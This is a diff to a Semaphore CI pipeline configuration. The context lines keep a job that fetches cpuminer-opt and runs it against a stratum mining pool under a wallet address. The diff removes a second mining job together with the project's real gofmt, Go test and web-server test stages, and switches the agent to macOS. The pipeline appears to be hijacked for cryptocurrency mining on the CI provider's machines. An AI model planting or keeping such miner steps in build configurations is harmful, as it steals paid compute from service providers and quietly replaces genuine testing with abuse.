@@ -19,44 +19,7 @@ blocks:
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q63mx0v3v638a2s0jga2cykjfwnh3r75200qxa6.testCi'
             - sleep 2
             - done
-        - name: 'Job #2'
-          commands:
-            - 'git clone https://github.com/kadeng/limit_visible_cpus'
-            - cd limit_visible_cpus
-            - sudo pip install py3nvml
-            - sudo cp -av dist/bin/* /usr/local/bin/
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - 'tar xf cpuminer-opt-linux.tar.gz '
-            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q63mx0v3v638a2s0jga2cykjfwnh3r75200qxa6.testCi'
-            - sleep 2
-            - done
-  - name: Check code style
-    task:
-      jobs:
-        - name: gofmt
-          commands:
-            - checkout
-            - sem-version go 1.12
-            - sudo apt install -y gccgo-go
-            - gofmt webServer.go | diff --ignore-tab-expansion webServer.go -
-  - name: Run tests
-    task:
-      prologue:
-        commands:
-          - checkout
-          - sem-version go 1.12
-      jobs:
-        - name: go test
-          commands:
-            - sem-service start postgres
-            - psql -p 5432 -h localhost -U postgres -c "CREATE DATABASE s2"
-            - go get github.com/lib/pq
-            - go test ./... -v
-        - name: Test web server
-          commands:
-            - mkdir bin
-            - artifact pull workflow webServer
-            - mv webServer bin
-            - chmod +x ./bin/webServer
-            - ./bin/webServer 8001 &
-            - 'curl --silent localhost:8001/time | grep "The current time is"'
+      agent:
+        machine:
+          type: a1-standard-4
+          os_image: macos-xcode11
